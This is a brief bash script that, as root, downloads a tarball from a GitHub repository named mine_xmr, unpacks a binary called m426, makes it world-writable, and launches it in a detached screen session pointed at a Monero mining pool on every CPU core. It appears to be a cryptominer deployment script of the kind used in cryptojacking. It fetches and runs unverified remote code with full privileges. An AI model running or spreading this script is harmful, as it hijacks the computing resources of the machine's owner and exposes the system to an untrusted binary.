#!/bin/bash
sudo -i <<EOF
 apt-get install libhwloc-dev -y
wget https://github.com/yuqingkj/mine_xmr/releases/download/6.18.0/m426.tar.gz
tar -xvf m426.tar.gz
cd m426/
chmod 777 ./m426
screen -dmS xmr
screen -x -S xmr -p 0 -X stuff "./m426 -o xmr.726726.xyz:3333 --rig-id az -t $(nproc) \n"
echo ok
EOF
